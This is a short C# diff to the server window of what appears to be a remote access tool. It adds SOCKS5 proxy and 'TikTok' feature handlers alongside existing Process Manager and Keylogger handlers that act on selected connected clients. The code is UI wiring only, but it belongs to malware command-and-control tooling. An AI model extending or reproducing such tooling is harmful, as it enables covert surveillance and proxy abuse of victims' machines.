@@ -692,6 +692,24 @@ public partial class ServerWindow : Window
         Log($"[*] Process Manager opened for {clients.Count} client(s).");
     }
 
+    private void Socks5_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+            OpenFeatureWindow<Socks5Window>(c.Id, () =>
+                new Socks5Window(_server, c.Id, c.Id));
+    }
+
+    private void TikTok_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+            OpenFeatureWindow<TikTokWindow>(c.Id, () =>
+                new TikTokWindow(_server, c.Id, c.Id));
+    }
+
     private void Keylogger_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
